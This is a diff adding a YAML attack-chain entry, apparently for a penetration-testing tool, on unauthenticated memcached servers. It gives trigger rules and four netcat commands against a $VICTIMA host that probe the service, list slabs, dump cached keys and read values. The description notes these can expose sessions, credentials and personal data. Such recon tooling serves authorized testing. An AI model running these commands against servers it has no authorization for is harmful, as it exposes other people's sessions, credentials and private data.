@@ -1,0 +1,39 @@
+chain_id: memcached_no_auth
+title: "memcached — anonymous dump of cached items"
+severity: MEDIUM
+tags: [memcached, no-auth, data-disclosure, recon]
+
+trigger:
+  any_of:
+    - { port: 11211 }
+    - { service_pattern: "(?i)memcache" }
+
+description: |
+  Open memcached with no auth (default). Cached items often include
+  full session blobs, rendered HTML with credentials, query results
+  with PII, and rate-limit counters. `stats slabs` + `stats cachedump`
+  walks the entire cache — manual but exhaustive.
+
+steps:
+  - id: 1
+    title: "Initial probe"
+    command: |
+      echo 'stats' | nc -q1 $VICTIMA 11211
+
+  - id: 2
+    title: "Enumerate slabs"
+    command: |
+      echo 'stats slabs' | nc -q1 $VICTIMA 11211
+
+  - id: 3
+    title: "Dump every key in slab N (replace N with the slab number)"
+    command: |
+      echo 'stats cachedump N 1000' | nc -q1 $VICTIMA 11211
+
+  - id: 4
+    title: "Get the value for an interesting key"
+    command: |
+      echo -e 'get KEY\nquit' | nc -q1 $VICTIMA 11211
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/11211-memcache
